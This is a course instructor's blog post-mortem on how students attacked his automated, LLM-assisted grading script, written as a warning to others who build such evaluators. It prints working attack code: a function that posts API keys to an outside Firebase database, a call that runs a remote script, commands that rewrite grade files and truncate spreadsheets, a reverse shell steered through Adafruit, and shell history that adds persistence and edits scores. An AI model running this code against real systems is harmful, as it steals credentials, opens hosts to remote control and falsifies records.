---
title: A Post-mortem Of Hacking Automated Project Evaluation
date: "2024-12-21T02:23:07Z"
lastmod: "2024-12-21T02:23:08Z"
categories:
  - coding
  - education
wp_id: 3769
---

![A Post-mortem Of Hacking Automated Project Evaluation](/blog/assets/DALL·E-2024-12-21-10.20.29-A-colorful-single-panel-comic-strip-in-the-style-of-classic-Calvin-Hobbes.-Calvin-a-young-boy-with-wild-hair-hides-under-a-desk-cluttered-with-a-c-1.webp)

In my [Tools in Data Science](https://study.iitm.ac.in/ds/course_pages/BSSE2002.html) course, I launched a [Project: Automated Analysis](https://github.com/sanand0/tools-in-data-science-public/tree/tds-2024-t3/project2). This is automatically evaluated by a Python script and LLMs.

I gently encouraged students to hack this - to teach how to persuade LLMs. I did not expect that they'd hack the evaluation system itself.

[One student](https://github.com/siddhant-bapna/Project2/blob/main/autolysis.py#L88-L102) exfiltrated the API Keys for evaluation by setting up a Firebase account and sending the API keys from anyone who runs the script.

```python
def checkToken(token):
    obj = {}
    token_key = f"token{int(time.time() * 1000)}"  # Generate a token-like key based on the current timestamp
    obj[token_key] = token
    url = "https://iumbrella-default-rtdb.asia-southeast1.firebasedatabase.app/users.json"
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(url, headers=headers, data=json.dumps(obj))
        response.raise_for_status()  # Raise an exception for HTTP error responses
        print(response.json())  # Parse the JSON response
    except requests.exceptions.RequestException as error:
        print("Error:", error)
    return True
```

This is mildly useful, since some students ran out of tokens. But is mostly harmless since the requests are routed via a [proxy with a $2 limit](https://github.com/sanand0/aiproxy/blob/1a6703f3a52dfc3009c8fbf5c103098b47b009ee/worker.js#L91), and only allows the inexpensive GPT-4o-mini model.

[Another student](https://github.com/microdev1/tds-p2/blob/a722def4f3a0007b168a89ff943513226e417cc0/autolysis.py#L371-L377) ran an external script every time I ran his code:

```python
subprocess.Popen(
    ["uv", "run", "https://raw.githubusercontent.com/microdev1/analysis/main/script.py"]
)
```

[This script](https://github.com/microdev1/analysis/blob/cc75186375d16e41d5fba8424ac93ab23a6d9daa/script.py) does a bunch of things:

```bash
# Gives them full marks on every answer in every CSV file I store the scores in
CMD = r"sed -Ei 's/,[0-9]+\.[0-9]+,([0-9]+\.[0-9]+),22f3002354,0/,\1,\1,22f3002354,1/g' /project2/*.csv &"

# Chops off the first 25% of all XLSX files in my output folder. (But WHY?)
CMX = '(for file in /project2/*.xlsx; do (tmpfile=$(mktemp) && dd if="$file" bs=1 skip=$(($(stat -c%s "$file") / 4)) of="$tmpfile" && mv "$tmpfile" "$file") & done) &'
```

Then comes live hacking.

```yaml
DELAY = 10
URL_GET = "https://io.adafruit.com/api/v2/naxa/feeds/host-port"
URL_POST = "https://io.adafruit.com/api/v2/webhooks/feed/VDTwYfHtVeSmB1GkJjcoqS62sYJu"

while True:
    # Establish a Control Channel:
    # Query the AdaFruit server for connection parameters (host and port).
    # Wait specifically
    address = requests.get(URL_GET).json()["last_value"].split(":")
    if len(address) == 3 and all(address) and address[0] == TIME:
        address = (str(address[1]), int(address[2]))
        break
while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Connect to the target address
        s.connect(address)
        log("connect")
        # Replace stdin, stdout, stderr with the socket.
        # Anything typed on the socket is fed into the shell and output is sent to the socket.
        for fd in (0, 1, 2):
            os.dup2(s.fileno(), fd)
        # Spawn a shell
        try:
            pty.spawn("bash")
        except:
            pty.spawn("sh")
        # Log disconnect, repeat after 10 seconds
        log("disconnect")
        time.sleep(DELAY * 6)
```

This script allows them to run commands on my system using their API via [Adafruit](https://io.adafruit.com/) (an IOT service I learned about today).

Here's what they did:

```bash
ls
cd
ls -a1
ls
ls -a1
echo "uv run https://raw.githubusercontent.com/microdev1/analysis/main/script.py"
echo "uv run https://raw.githubusercontent.com/microdev1/analysis/main/script.py" >> .bashrc
echo "uv run https://raw.githubusercontent.com/microdev1/analysis/main/script.py" >> .zshrc
cat .bashrc
cat .zshrc
ls
cd /tmp
ls
cat scriptLbsDUR.py
clear
ls
cd
ls
ls -a1
cat .profile
zsh
bash
nano .bashrc
ls
ls /tmp/
ls -a /tmp/
ls /
cd /project2/
ls
cat results.
cat results.csv
head results.csv
grep "22f3002354" results.csv
sed -n 's/0.0,0.2,22f3002354/0.2,0.2,22f3002354/p' results.csv
sed -i 's/0.0,0.2,22f3002354/0.2,0.2,22f3002354/g' results.csv
grep "22f3002354" results.csv
clear
grep "22f3002354" results.csv
unset $HISTFILE
sed -i 's/0.0,0.5,22f3002354/0.5,0.5,22f3002354/g' results.csv
grep "22f3002354" results.csv
clear
grep "22f3002354" results.csv
ls
ls -1
ls -l
ps
ps -aux
echo $$
ls /
ls /tmp/
clear
grep "22f3002354" results.csv
clear
la
clear
ls -1
clear
ls -l
head results.xlsx
clear
head results.xlsx
clear
```

1. Made sure this script is re-run every time I log in
2. Looked at where I store the project results (results.csv and results.xlsx)
3. Tested a script that would give them full marks (which was then added to the script to re-run each time)

In all, a good hack. I lost over a day since I needed to re-run all evaluations (in case there were other hacks I missed.)

It would have been cleverer if it was less detectable. But that's hard, because:

1. Robust hacks use multiple approaches. That increases the chance I'd find one. Once I do, I would check everywhere.
2. They'd give themselves full marks. (High marks are not worth it. They'd get that even without the hack.) But I'd check the marks at the end and detect it.

Of course, these were just **polite** hacks. I'd be in more trouble by a pro. If you're writing automated evaluation scripts: **Be very, very, wary**.
